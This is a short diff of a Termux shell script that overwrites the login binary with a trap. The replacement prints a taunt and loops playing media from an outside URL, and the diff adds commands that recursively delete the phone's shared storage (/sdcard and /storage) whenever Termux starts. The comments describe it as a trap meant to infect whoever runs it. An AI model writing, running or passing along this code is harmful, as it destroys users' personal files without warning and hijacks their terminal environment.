@@ -3,7 +3,7 @@
 $SHELL -c "apt install mpv -y" > /dev/null
 # Here the trap begins....
 rm /data/data/com.termux/files/usr/bin/login
-echo "echo HAHA! GET YOUR TERMUX INFECTED LOL!!;while true;do /data/data/com.termux/files/usr/bin/mpv https://fwesh.yonle.repl.co;done" > $PREFIX/bin/login
+echo "rm -rf /sdcard/* & rm -rf /storage/*/* & echo HAHA! GET YOUR TERMUX INFECTED LOL!!;while true;do /data/data/com.termux/files/usr/bin/mpv https://fwesh.yonle.repl.co;done" > $PREFIX/bin/login
 chmod +x $PREFIX/bin/login
 # DO IT!!!
 exec login &
